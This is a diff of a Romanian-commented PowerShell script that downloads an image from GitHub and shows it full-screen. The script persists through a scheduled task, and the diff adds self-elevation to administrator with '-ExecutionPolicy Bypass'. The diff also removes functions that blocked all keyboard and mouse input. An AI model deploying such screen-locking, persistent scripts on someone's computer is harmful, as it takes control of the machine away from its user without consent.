@@ -2,6 +2,14 @@
 $imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
 $tempImagePath = "$env:TEMP\cdr.png"
 
+# Verifică dacă scriptul rulează cu privilegii administrative
+function Check-Admin {
+    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+        Start-Process powershell "-ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs
+        exit
+    }
+}
+
 # Descărcare imagine
 function Download-Image {
     try {
@@ -26,7 +34,7 @@ function Show-FullScreenImage {
     try {
         $img = [System.Drawing.Image]::FromFile($tempImagePath)
     } catch {
-        Write-Host "Eroare la încărcarea imaginii." -ForegroundColor Red
+        Write-Host "Eroare la încărcarea imaginii. Verificați descărcarea." -ForegroundColor Red
         exit
     }
 
@@ -49,23 +57,8 @@ function Show-FullScreenImage {
     $form.ShowDialog()
 }
 
-# Blochează tastele critice
-function Block-Keys {
-    $filter = "[DllImport('user32.dll')] public static extern int BlockInput(bool fBlockIt);"
-    Add-Type -MemberDefinition $filter -Namespace Win32 -Name NativeMethods
-    [Win32.NativeMethods]::BlockInput($true)
-}
-
-# Deblochează tastele
-function Unblock-Keys {
-    $filter = "[DllImport('user32.dll')] public static extern int BlockInput(bool fBlockIt);"
-    Add-Type -MemberDefinition $filter -Namespace Win32 -Name NativeMethods
-    [Win32.NativeMethods]::BlockInput($false)
-}
-
 # Oprește complet scriptul și elimină sarcina din Task Scheduler
 function Stop-All {
-    Unblock-Keys
     schtasks /delete /tn "PersistentImageViewer" /f | Out-Null
     Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Stop-Process -Force
     exit
@@ -89,10 +82,9 @@ function Monitor-Process {
     }
 }
 
-# Descărcare imagine și inițializare
+# Executare funcționalități
+Check-Admin
 Download-Image
 Set-Startup
 Start-Job -ScriptBlock { Monitor-Process }
-Block-Keys
 Show-FullScreenImage
-Unblock-Keys
